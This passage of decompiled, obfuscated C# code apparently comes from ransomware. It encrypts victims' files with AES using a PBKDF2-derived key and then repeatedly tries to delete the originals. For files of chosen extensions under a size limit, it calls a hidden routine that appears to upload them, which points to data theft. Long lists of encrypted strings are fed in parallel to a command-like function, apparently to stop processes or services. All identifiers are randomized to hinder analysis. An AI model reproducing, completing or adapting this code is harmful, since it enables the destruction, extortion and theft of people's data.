			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (JhBqPOdPslDLd == getString_0(107396768))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.kZerlxSVnfjP.Length > 0)
				{
					if (YeRjXesflK == getString_0(107396768))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in tdGoFrmZRSDgex)
						{
							if (CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV.ToLower().EndsWith(item) && ZmtAmSRTqWRL == getString_0(107396768))
							{
								if (Convert.ToInt32(PXbtmkwFEcS) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392481), getString_0(107392476), getString_0(107392431), CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV.ToLower().EndsWith(item) && ZmtAmSRTqWRL == getString_0(107396225))
							{
								try
								{
									ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392481), getString_0(107392476), getString_0(107392431), CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.kZerlxSVnfjP.EndsWith(getString_0(107389673)))
					{
						File.Move(CS_0024_003C_003E8__locals0.kZerlxSVnfjP, CS_0024_003C_003E8__locals0.kZerlxSVnfjP.Replace(getString_0(107389673), getString_0(107392368)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.kZerlxSVnfjP))
							{
								File.Delete(CS_0024_003C_003E8__locals0.kZerlxSVnfjP);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (TfpcYTfYwiZ)
			{
				try
				{
					File.AppendAllText(XTpFtiqHigTwzn, getString_0(107390442) + CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV + getString_0(107389696) + ex2.Message + getString_0(107396589));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = aVSgOyvOKixiOZhem;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				jZJYIJgzyrqgig(getString_0(107389611), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> source2 = qVSYqPqzFDgvw;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				jZJYIJgzyrqgig(getString_0(107389634), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> source3 = zXIdDQEuVwYo;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107389621)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (twaCZwLhmnIEaDXX == getString_0(107396768))
		{
			string[] source4 = pxwofrQHvBYQmc;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107389621)), getString_0(107389596) + string_0 + getString_0(107389555));
				};
			}
			Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!QwrjqVpAtpM().Contains(getString_0(107390340)))
		{
			afZIDbbbfqB(ubHXHkwsTjIxkt);
		}
		else
		{
			List<string> source5 = tmHaEWqnXudg;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					jZJYIJgzyrqgig(UMsFeqgmECpmMQw(VgkfvqvnQmIYVv(getString_0(107389550))), string_0);
				};
			}
			Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> cygYQxkVcvLjEa = CygYQxkVcvLjEa;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107389557)), string_0);
			};
		}
		Parallel.ForEach(cygYQxkVcvLjEa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> zJnGvhEgMPvKo = ZJnGvhEgMPvKo;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				jZJYIJgzyrqgig(getString_0(107390052), string_0);
			};
		}
		Parallel.ForEach(zJnGvhEgMPvKo, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		jZJYIJgzyrqgig(getString_0(107389611), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		jZJYIJgzyrqgig(getString_0(107389634), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107389621)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107389621)), getString_0(107389596) + string_0 + getString_0(107389555));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		jZJYIJgzyrqgig(UMsFeqgmECpmMQw(VgkfvqvnQmIYVv(getString_0(107389550))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107389557)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		jZJYIJgzyrqgig(getString_0(107390052), string_0);
	}

	static fdvkylEGapkbT()
	{
		Strings.CreateGetStringDelegate(typeof(fdvkylEGapkbT));
		HUFUXAJeqIWSXcOELF = getString_0(107391813);
		UCLDIbRwOFSI = null;
		YTHZdrAysCSCqJCP = getString_0(107396225);
		fKoTDIHCrS = getString_0(107390043);
		thizDxJzbdFr = new List<string>();
		sCKBxESJMpvVXp = new List<string>();
		GDCYhuWfDwyNq = getString_0(107396225);
		mHfWrQyDyHEP = getString_0(107392368);
		oUoqPtPNHwCatJ = getString_0(107392368);
		APjcYBpyaaCnVsgh = getString_0(107396225);
		dhLFyhDQAcxBwkEP = 0;
		PvdtfERdGevF = getString_0(107396225);
		zqwWpGhEpOpQ = getString_0(107396225);
		FUbpLpWkniIyR = getString_0(107396225);
		yGIDvMHITfCct = getString_0(107389998);
		mViNJNiByIZ = getString_0(107396225);
		WhzpJhMGWQlH = getString_0(107396225);
		BhvDdMThqgWvU = getString_0(107396225);
		zPkDxLdFtqsabg = getString_0(107396225);
		NTmjnOoDFhsRo = new List<string>
		{
			UMsFeqgmECpmMQw(getString_0(107389993)),
			UMsFeqgmECpmMQw(getString_0(107390008)),
			UMsFeqgmECpmMQw(getString_0(107389983)),
			UMsFeqgmECpmMQw(getString_0(107389934)),
			UMsFeqgmECpmMQw(getString_0(107389941)),
			UMsFeqgmECpmMQw(getString_0(107389916)),
			UMsFeqgmECpmMQw(getString_0(107389867)),
			UMsFeqgmECpmMQw(getString_0(107389842)),
			UMsFeqgmECpmMQw(getString_0(107389849)),
			UMsFeqgmECpmMQw(getString_0(107389824)),
			UMsFeqgmECpmMQw(getString_0(107389263)),
			UMsFeqgmECpmMQw(getString_0(107389270)),
			UMsFeqgmECpmMQw(getString_0(107389245))
		};
		NnXnVroauy = new List<string>();
		bANDxossLvmXg = getString_0(107396225);
		wvrLujKHhRyU = getString_0(107396225);
		OKhadXAVJsKMfGp = getString_0(107396225);
		yPXLGtMRJTLFe = new List<string>();
		xsOPJPlgcqHwrV = getString_0(107396225);
		xlZuURyEYkVM = getString_0(107389220);
		kPvytyWmXkPBKlYej = getString_0(107396768);
		GhkKkHGcETIsMQh = getString_0(107396225);
		qVSYqPqzFDgvw = new List<string>
		{
			UMsFeqgmECpmMQw(getString_0(107389139)),
			UMsFeqgmECpmMQw(getString_0(107389106)),
			UMsFeqgmECpmMQw(getString_0(107389073)),
			UMsFeqgmECpmMQw(getString_0(107389040)),
			UMsFeqgmECpmMQw(getString_0(107389519)),
			UMsFeqgmECpmMQw(getString_0(107389490)),
			UMsFeqgmECpmMQw(getString_0(107389465)),
			UMsFeqgmECpmMQw(getString_0(107389436)),
			UMsFeqgmECpmMQw(getString_0(107389359)),
			UMsFeqgmECpmMQw(getString_0(107389294)),
			UMsFeqgmECpmMQw(getString_0(107388749)),
			UMsFeqgmECpmMQw(getString_0(107388716)),
			UMsFeqgmECpmMQw(getString_0(107388683)),
			UMsFeqgmECpmMQw(getString_0(107388654)),
			UMsFeqgmECpmMQw(getString_0(107388625)),
			UMsFeqgmECpmMQw(getString_0(107388584)),
			UMsFeqgmECpmMQw(getString_0(107388575)),
			UMsFeqgmECpmMQw(getString_0(107388998)),
			UMsFeqgmECpmMQw(getString_0(107388981)),
			UMsFeqgmECpmMQw(getString_0(107388916)),
			UMsFeqgmECpmMQw(getString_0(107388919)),
			UMsFeqgmECpmMQw(getString_0(107388846)),
			UMsFeqgmECpmMQw(getString_0(107388805)),
			UMsFeqgmECpmMQw(getString_0(107388804)),
			UMsFeqgmECpmMQw(getString_0(107388211)),
			UMsFeqgmECpmMQw(getString_0(107388186)),
			UMsFeqgmECpmMQw(getString_0(107388113)),
			UMsFeqgmECpmMQw(getString_0(107388084)),
			UMsFeqgmECpmMQw(getString_0(107388043)),
			UMsFeqgmECpmMQw(getString_0(107388498)),
			UMsFeqgmECpmMQw(getString_0(107388433)),
			UMsFeqgmECpmMQw(getString_0(107388408)),
			UMsFeqgmECpmMQw(getString_0(107388343)),
			UMsFeqgmECpmMQw(getString_0(107388262)),
			UMsFeqgmECpmMQw(getString_0(107387685)),
			UMsFeqgmECpmMQw(getString_0(107387628)),
			UMsFeqgmECpmMQw(getString_0(107387595)),
			UMsFeqgmECpmMQw(getString_0(107387586)),
			UMsFeqgmECpmMQw(getString_0(107387545)),
			UMsFeqgmECpmMQw(getString_0(107387980)),
			UMsFeqgmECpmMQw(getString_0(107387951)),
			UMsFeqgmECpmMQw(getString_0(107387886)),
			UMsFeqgmECpmMQw(getString_0(107387845)),
			UMsFeqgmECpmMQw(getString_0(107387844)),
			UMsFeqgmECpmMQw(getString_0(107387803)),
			UMsFeqgmECpmMQw(getString_0(107387210)),
			UMsFeqgmECpmMQw(getString_0(107387197)),
			UMsFeqgmECpmMQw(getString_0(107387092)),
			UMsFeqgmECpmMQw(getString_0(107387047)),
			UMsFeqgmECpmMQw(getString_0(107387034)),
			UMsFeqgmECpmMQw(getString_0(107387469)),
			UMsFeqgmECpmMQw(getString_0(107387460)),
			UMsFeqgmECpmMQw(getString_0(107387387)),
			UMsFeqgmECpmMQw(getString_0(107387358)),
			UMsFeqgmECpmMQw(getString_0(107387317)),
			UMsFeqgmECpmMQw(getString_0(107386708)),
			UMsFeqgmECpmMQw(getString_0(107386663)),
			UMsFeqgmECpmMQw(getString_0(107386634)),
			UMsFeqgmECpmMQw(getString_0(107386621)),
			UMsFeqgmECpmMQw(getString_0(107386556)),
			UMsFeqgmECpmMQw(getString_0(107386527)),
			UMsFeqgmECpmMQw(getString_0(107386950)),
			UMsFeqgmECpmMQw(getString_0(107386885)),
			UMsFeqgmECpmMQw(getString_0(107386876)),
			UMsFeqgmECpmMQw(getString_0(107386847)),
			UMsFeqgmECpmMQw(getString_0(107386806)),
			UMsFeqgmECpmMQw(getString_0(107386181)),
			UMsFeqgmECpmMQw(getString_0(107386120)),
			UMsFeqgmECpmMQw(getString_0(107386079)),
			UMsFeqgmECpmMQw(getString_0(107386002)),
			UMsFeqgmECpmMQw(getString_0(107385969)),
			UMsFeqgmECpmMQw(getString_0(107386440)),
			UMsFeqgmECpmMQw(getString_0(107386395)),
			UMsFeqgmECpmMQw(getString_0(107386318)),
			UMsFeqgmECpmMQw(getString_0(107386261)),
			UMsFeqgmECpmMQw(getString_0(107385700)),
			UMsFeqgmECpmMQw(getString_0(107385639)),
			UMsFeqgmECpmMQw(getString_0(107385630)),
			UMsFeqgmECpmMQw(getString_0(107385565)),
			UMsFeqgmECpmMQw(getString_0(107385484)),
			UMsFeqgmECpmMQw(getString_0(107385939)),
			UMsFeqgmECpmMQw(getString_0(107385906)),
			UMsFeqgmECpmMQw(getString_0(107385877)),
			UMsFeqgmECpmMQw(getString_0(107385820)),
			UMsFeqgmECpmMQw(getString_0(107387628)),
			UMsFeqgmECpmMQw(getString_0(107385763)),
			UMsFeqgmECpmMQw(getString_0(107385722)),
			UMsFeqgmECpmMQw(getString_0(107385121)),
			UMsFeqgmECpmMQw(getString_0(107385044)),
			UMsFeqgmECpmMQw(getString_0(107385015)),
			UMsFeqgmECpmMQw(getString_0(107384990)),
			UMsFeqgmECpmMQw(getString_0(107385425)),
			UMsFeqgmECpmMQw(getString_0(107385408)),
			UMsFeqgmECpmMQw(getString_0(107388498)),
			UMsFeqgmECpmMQw(getString_0(107385343)),
			UMsFeqgmECpmMQw(getString_0(107385302)),
			UMsFeqgmECpmMQw(getString_0(107385245)),
			UMsFeqgmECpmMQw(getString_0(107388433)),
			UMsFeqgmECpmMQw(getString_0(107384628)),
			UMsFeqgmECpmMQw(getString_0(107384611)),
			UMsFeqgmECpmMQw(getString_0(107384490)),
			UMsFeqgmECpmMQw(getString_0(107384425)),
			UMsFeqgmECpmMQw(getString_0(107384920)),
			UMsFeqgmECpmMQw(getString_0(107388343)),
			UMsFeqgmECpmMQw(getString_0(107384811)),
			UMsFeqgmECpmMQw(getString_0(107387595)),
			UMsFeqgmECpmMQw(getString_0(107388262)),
			UMsFeqgmECpmMQw(getString_0(107384778)),
			UMsFeqgmECpmMQw(getString_0(107384721)),
			UMsFeqgmECpmMQw(getString_0(107387685)),
			UMsFeqgmECpmMQw(getString_0(107384688)),
			UMsFeqgmECpmMQw(getString_0(107384159)),
			UMsFeqgmECpmMQw(getString_0(107384078)),
			UMsFeqgmECpmMQw(getString_0(107388043)),
			UMsFeqgmECpmMQw(getString_0(107384085)),
			UMsFeqgmECpmMQw(getString_0(107384008)),
			UMsFeqgmECpmMQw(getString_0(107383979)),
			UMsFeqgmECpmMQw(getString_0(107383950)),
			UMsFeqgmECpmMQw(getString_0(107383937)),
			UMsFeqgmECpmMQw(getString_0(107384416)),
			UMsFeqgmECpmMQw(getString_0(107384359)),
			UMsFeqgmECpmMQw(getString_0(107384346)),
			UMsFeqgmECpmMQw(getString_0(107384321)),
			UMsFeqgmECpmMQw(getString_0(107384280)),
			UMsFeqgmECpmMQw(getString_0(107384203)),
			UMsFeqgmECpmMQw(getString_0(107384186)),
			UMsFeqgmECpmMQw(getString_0(107383617)),
			UMsFeqgmECpmMQw(getString_0(107383584)),
			UMsFeqgmECpmMQw(getString_0(107383507)),
			UMsFeqgmECpmMQw(getString_0(107383474)),
			UMsFeqgmECpmMQw(getString_0(107383433)),
			UMsFeqgmECpmMQw(getString_0(107388084)),
			UMsFeqgmECpmMQw(getString_0(107384186)),
			UMsFeqgmECpmMQw(getString_0(107383424)),
			UMsFeqgmECpmMQw(getString_0(107383907)),
			UMsFeqgmECpmMQw(getString_0(107383846)),
			UMsFeqgmECpmMQw(getString_0(107383829)),
			UMsFeqgmECpmMQw(getString_0(107383756)),
			UMsFeqgmECpmMQw(getString_0(107383695)),
			UMsFeqgmECpmMQw(getString_0(107383110)),
			UMsFeqgmECpmMQw(getString_0(107383081)),
			UMsFeqgmECpmMQw(getString_0(107383048)),
			UMsFeqgmECpmMQw(getString_0(107383007)),
			UMsFeqgmECpmMQw(getString_0(107382978)),
			UMsFeqgmECpmMQw(getString_0(107382933)),
			UMsFeqgmECpmMQw(getString_0(107383348)),
			UMsFeqgmECpmMQw(getString_0(107383315)),
			UMsFeqgmECpmMQw(getString_0(107383270)),
			UMsFeqgmECpmMQw(getString_0(107383209)),
			UMsFeqgmECpmMQw(getString_0(107383176)),
			UMsFeqgmECpmMQw(getString_0(107383163)),
			UMsFeqgmECpmMQw(getString_0(107382586)),
			UMsFeqgmECpmMQw(getString_0(107382553)),
			UMsFeqgmECpmMQw(getString_0(107382480)),
			UMsFeqgmECpmMQw(getString_0(107382463)),
			UMsFeqgmECpmMQw(getString_0(107388211)),
			UMsFeqgmECpmMQw(getString_0(107382434)),
			UMsFeqgmECpmMQw(getString_0(107382857)),
			UMsFeqgmECpmMQw(getString_0(107382848)),
			UMsFeqgmECpmMQw(getString_0(107382771)),
			UMsFeqgmECpmMQw(getString_0(107382730)),
			UMsFeqgmECpmMQw(getString_0(107382717)),
			UMsFeqgmECpmMQw(getString_0(107382656)),
			UMsFeqgmECpmMQw(getString_0(107382063)),
			UMsFeqgmECpmMQw(getString_0(107382046)),
			UMsFeqgmECpmMQw(getString_0(107381957)),
			UMsFeqgmECpmMQw(getString_0(107381900)),
			UMsFeqgmECpmMQw(getString_0(107381887)),
			UMsFeqgmECpmMQw(getString_0(107382358)),
			UMsFeqgmECpmMQw(getString_0(107382301)),
			UMsFeqgmECpmMQw(getString_0(107388186)),
			UMsFeqgmECpmMQw(getString_0(107382196)),
			UMsFeqgmECpmMQw(getString_0(107382199)),
			UMsFeqgmECpmMQw(getString_0(107382166)),
			UMsFeqgmECpmMQw(getString_0(107381581)),
			UMsFeqgmECpmMQw(getString_0(107381552)),
			UMsFeqgmECpmMQw(getString_0(107388804)),
			UMsFeqgmECpmMQw(getString_0(107381511)),
			UMsFeqgmECpmMQw(getString_0(107381494)),
			UMsFeqgmECpmMQw(getString_0(107381465)),
			UMsFeqgmECpmMQw(getString_0(107386527)),
			UMsFeqgmECpmMQw(getString_0(107381432)),
			UMsFeqgmECpmMQw(getString_0(107381465)),
			UMsFeqgmECpmMQw(getString_0(107381403)),
			UMsFeqgmECpmMQw(getString_0(107381374)),
			UMsFeqgmECpmMQw(getString_0(107381857)),
			UMsFeqgmECpmMQw(getString_0(107381776)),
			UMsFeqgmECpmMQw(getString_0(107381759)),
			UMsFeqgmECpmMQw(getString_0(107381718)),
			UMsFeqgmECpmMQw(getString_0(107381657)),
			UMsFeqgmECpmMQw(getString_0(107381628)),
			UMsFeqgmECpmMQw(getString_0(107381043)),
			UMsFeqgmECpmMQw(getString_0(107380998)),
			UMsFeqgmECpmMQw(getString_0(107380985)),
			UMsFeqgmECpmMQw(getString_0(107380952)),
			UMsFeqgmECpmMQw(getString_0(107380895)),
			UMsFeqgmECpmMQw(getString_0(107381330)),
			UMsFeqgmECpmMQw(getString_0(107381305)),
			UMsFeqgmECpmMQw(getString_0(107381272)),
			UMsFeqgmECpmMQw(getString_0(107381199)),
			UMsFeqgmECpmMQw(getString_0(107381170)),
			UMsFeqgmECpmMQw(getString_0(107381141)),
			UMsFeqgmECpmMQw(getString_0(107413332)),
			UMsFeqgmECpmMQw(getString_0(107413307)),
			UMsFeqgmECpmMQw(getString_0(107413234)),
			UMsFeqgmECpmMQw(getString_0(107413217)),
			UMsFeqgmECpmMQw(getString_0(107413184)),
			UMsFeqgmECpmMQw(getString_0(107413103)),
			UMsFeqgmECpmMQw(getString_0(107413602)),
			UMsFeqgmECpmMQw(getString_0(107413521)),
			UMsFeqgmECpmMQw(getString_0(107413508)),
			UMsFeqgmECpmMQw(getString_0(107413427)),
			UMsFeqgmECpmMQw(getString_0(107413394)),
			UMsFeqgmECpmMQw(getString_0(107413353)),
			UMsFeqgmECpmMQw(getString_0(107412832)),
			UMsFeqgmECpmMQw(getString_0(107412755)),
			UMsFeqgmECpmMQw(getString_0(107383756)),
			UMsFeqgmECpmMQw(getString_0(107412722)),
			UMsFeqgmECpmMQw(getString_0(107412681)),
			UMsFeqgmECpmMQw(getString_0(107412624)),
			UMsFeqgmECpmMQw(getString_0(107412595)),
			UMsFeqgmECpmMQw(getString_0(107413074)),
			UMsFeqgmECpmMQw(getString_0(107413041)),
			UMsFeqgmECpmMQw(getString_0(107413024)),
			UMsFeqgmECpmMQw(getString_0(107412995)),
			UMsFeqgmECpmMQw(getString_0(107412950)),
			UMsFeqgmECpmMQw(getString_0(107412873)),
			UMsFeqgmECpmMQw(getString_0(107412864)),
			UMsFeqgmECpmMQw(getString_0(107412263)),
			UMsFeqgmECpmMQw(getString_0(107412246)),
			UMsFeqgmECpmMQw(getString_0(107412217)),
			UMsFeqgmECpmMQw(getString_0(107412140))
		};
		aVSgOyvOKixiOZhem = new List<string>
		{
			UMsFeqgmECpmMQw(getString_0(107412131)),
			UMsFeqgmECpmMQw(getString_0(107412562)),
			UMsFeqgmECpmMQw(getString_0(107412545)),
			UMsFeqgmECpmMQw(getString_0(107412464)),
			UMsFeqgmECpmMQw(getString_0(107412447)),
			UMsFeqgmECpmMQw(getString_0(107412382)),
			UMsFeqgmECpmMQw(getString_0(107411761)),
			UMsFeqgmECpmMQw(getString_0(107411700))
		};
		zXIdDQEuVwYo = new List<string>
		{
			UMsFeqgmECpmMQw(getString_0(107411675)),
			UMsFeqgmECpmMQw(getString_0(107411642)),
			UMsFeqgmECpmMQw(getString_0(107411565)),
			UMsFeqgmECpmMQw(getString_0(107412060)),
			UMsFeqgmECpmMQw(getString_0(107412027)),
			UMsFeqgmECpmMQw(getString_0(107411946)),
			UMsFeqgmECpmMQw(getString_0(107411933)),
			UMsFeqgmECpmMQw(getString_0(107411900)),
			UMsFeqgmECpmMQw(getString_0(107411867)),
			UMsFeqgmECpmMQw(getString_0(107411834)),
			UMsFeqgmECpmMQw(getString_0(107411289)),
			UMsFeqgmECpmMQw(getString_0(107411256)),
			UMsFeqgmECpmMQw(getString_0(107411183)),
			UMsFeqgmECpmMQw(getString_0(107411142)),
			UMsFeqgmECpmMQw(getString_0(107411129)),
			UMsFeqgmECpmMQw(getString_0(107411096)),
			UMsFeqgmECpmMQw(getString_0(107411535)),
			UMsFeqgmECpmMQw(getString_0(107411502)),
			UMsFeqgmECpmMQw(getString_0(107411461)),
			UMsFeqgmECpmMQw(getString_0(107411452)),
			UMsFeqgmECpmMQw(getString_0(107411419)),
			UMsFeqgmECpmMQw(getString_0(107411346)),
			UMsFeqgmECpmMQw(getString_0(107411313)),
			UMsFeqgmECpmMQw(getString_0(107411675)),
			UMsFeqgmECpmMQw(getString_0(107410760)),
			UMsFeqgmECpmMQw(getString_0(107410751)),
			UMsFeqgmECpmMQw(getString_0(107410674)),
			UMsFeqgmECpmMQw(getString_0(107410641)),
			UMsFeqgmECpmMQw(getString_0(107410600)),
			UMsFeqgmECpmMQw(getString_0(107410591)),
			UMsFeqgmECpmMQw(getString_0(107410558)),
			UMsFeqgmECpmMQw(getString_0(107411029)),
			UMsFeqgmECpmMQw(getString_0(107410956)),
			UMsFeqgmECpmMQw(getString_0(107411642)),
			UMsFeqgmECpmMQw(getString_0(107410947)),
			UMsFeqgmECpmMQw(getString_0(107411565)),
			UMsFeqgmECpmMQw(getString_0(107410914)),
			UMsFeqgmECpmMQw(getString_0(107410881)),
			UMsFeqgmECpmMQw(getString_0(107410840)),
			UMsFeqgmECpmMQw(getString_0(107410807)),
			UMsFeqgmECpmMQw(getString_0(107410222)),
			UMsFeqgmECpmMQw(getString_0(107410181)),
			UMsFeqgmECpmMQw(getString_0(107410180)),
			UMsFeqgmECpmMQw(getString_0(107410147)),
			UMsFeqgmECpmMQw(getString_0(107410106)),
			UMsFeqgmECpmMQw(getString_0(107410033)),
			UMsFeqgmECpmMQw(getString_0(107410504))
		};
		tmHaEWqnXudg = new List<string>
		{
			UMsFeqgmECpmMQw(VgkfvqvnQmIYVv(getString_0(107410495))),
			UMsFeqgmECpmMQw(getString_0(107410414)),
			UMsFeqgmECpmMQw(getString_0(107410321)),
			UMsFeqgmECpmMQw(getString_0(107409712)),
			UMsFeqgmECpmMQw(getString_0(107409619)),
			UMsFeqgmECpmMQw(getString_0(107409522)),
			UMsFeqgmECpmMQw(getString_0(107409973)),
			UMsFeqgmECpmMQw(getString_0(107409844)),
			UMsFeqgmECpmMQw(getString_0(107409783)),
			UMsFeqgmECpmMQw(getString_0(107409174)),
			UMsFeqgmECpmMQw(getString_0(107409081)),
			UMsFeqgmECpmMQw(getString_0(107409496)),
			UMsFeqgmECpmMQw(getString_0(107409403)),
			UMsFeqgmECpmMQw(VgkfvqvnQmIYVv(getString_0(107410495)))
		};
		ubHXHkwsTjIxkt = UMsFeqgmECpmMQw(getString_0(107409306));
		CygYQxkVcvLjEa = new List<string>
		{
			UMsFeqgmECpmMQw(getString_0(107408649)),
			UMsFeqgmECpmMQw(getString_0(107408967)),
			UMsFeqgmECpmMQw(getString_0(107408773)),
			UMsFeqgmECpmMQw(getString_0(107408099)),
			UMsFeqgmECpmMQw(getString_0(107408417)),
			UMsFeqgmECpmMQw(getString_0(107407711))
		};
		ZJnGvhEgMPvKo = new List<string>
		{
			UMsFeqgmECpmMQw(getString_0(107407517)),
			UMsFeqgmECpmMQw(getString_0(107407968)),
			UMsFeqgmECpmMQw(getString_0(107407907))
		};
		nFbLIGlZufY = getString_0(107396225);
		RQnfPUyabvkbjBQM = getString_0(107396225);
		ytdAcOLjjYclpCEH = new DateTime(2000, 1, 1);
		ZnXhduYGGrm = new DateTime(2100, 1, 1);
		KFmKhFFHYbFap = getString_0(107396768);
		FSmYeUMoln = getString_0(107389767);
		MnwIXccgUusgmGvAy = getString_0(107396225);
		ADqeVnjfTXdQR = getString_0(107396225);
		omdhjJpTFXA = getString_0(107396225);
		ysWDZXyQAhJsziRY = getString_0(107396768);
		CkXxFahCHvdk = getString_0(107396225);
		YeRjXesflK = getString_0(107396225);
		tdGoFrmZRSDgex = new List<string>
		{
			getString_0(107395778),
			getString_0(107396004),
			getString_0(107395812),
			getString_0(107395341)
		};
		ZmtAmSRTqWRL = getString_0(107396225);
		PXbtmkwFEcS = getString_0(107407814);
		PeLXcMKcTo = getString_0(107396225);
		fNFwbvvmkpHs = getString_0(107396225);
		VuJRMnRTldZYI = getString_0(107396225);
		NbphLPFvGkuDBm = string.Empty;
		DxVYyifBkANCm = getString_0(107396225);
		FzbjSrgZSQZGnPC = getString_0(107396225);
		rsErtYlITiucN = getString_0(107396225);
		DmasaMBmVEkl = getString_0(107392368);
		FNsZBepHglFQTs = getString_0(107392368);
		vhhjVkqlJLg = getString_0(107396225);
		qAYmmQxaNZn = getString_0(107396225);
		DoGzWEXZVfOnAZf = getString_0(107396768);
		CqkoqGibgFXpfa = getString_0(107396768);
		KcOjUgDSQtgGnAaT = getString_0(107396225);
		EULsvRoNCvsdCJWVe = getString_0(107407841);
		tEKuBqPjBuOCshFU = getString_0(107396225);
		BxydwWlazJYo = getString_0(107396225);
		vRtRaLVWxUWQ = getString_0(107407792);
		xJmSgvErkcgu = getString_0(107396225);
		aWROomwhSppOv = getString_0(107396225);
		yyUmWvysfpc = getString_0(107396225);
		RVLdkLAFsbNV = getString_0(107396225);
		NcfjRizCakajSGl = getString_0(107407803);
		LJXMmTWpXnaK = getString_0(107396768);
		ifyYfKFnqSzZyvn = getString_0(107396768);
		qcCGpHkhmED = getString_0(107396225);
